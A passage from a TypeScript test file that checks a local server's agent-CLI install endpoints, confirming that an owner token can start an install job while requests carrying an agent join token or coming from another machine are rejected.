      localAgents: {
        cli: { command: "/usr/bin/node", args: ["cli.js"] },
        serverUrl: "http://127.0.0.1:8787",
        spawn: vi.fn<SpawnAgent>(),
        probe: async () => ({ installed: true, version: "1.0.0" }),
      },
    });
    try {
      const session = (await app.inject({ method: "GET", url: "/api/local/session" })).json() as {
        ownerToken: string;
      };
      const owner = { "x-hive-owner": session.ownerToken };
      expect(
        (
          await app.inject({ method: "GET", url: "/api/local/agent-clis/current", headers: owner })
        ).json(),
      ).toEqual({ job: null });
      const started = await app.inject({
        method: "POST",
        url: "/api/local/agent-clis/codex/install",
        headers: owner,
        payload: { command: (codex.plan as { command: string }).command },
      });
      expect(started.statusCode).toBe(202);
      const current = await app.inject({
        method: "GET",
        url: "/api/local/agent-clis/current",
        headers: owner,
      });
      expect(current.json()).toMatchObject({ job: { action: "install", state: "running" } });
      expect(logs.filter((line) => line.includes('"agentCli"')).join()).toContain(
        '"action":"install"',
      );
      // 别的电脑、Agent 令牌都拒绝
      for (const call of [
        { method: "GET" as const, url: "/api/local/agent-clis/current" },
        {
          method: "POST" as const,
          url: "/api/local/agent-clis/codex/install",
          payload: { command: "x" },
        },
      ]) {
        expect(
          (await app.inject({ ...call, headers: { authorization: "Bearer join-token" } }))
            .statusCode,
        ).toBe(401);
        expect((await app.inject({ ...call, remoteAddress: "10.0.0.20" })).statusCode).toBe(403);
      }
      expect(children).toHaveLength(1);
    } finally {
      await app.close();
    }
  });
});
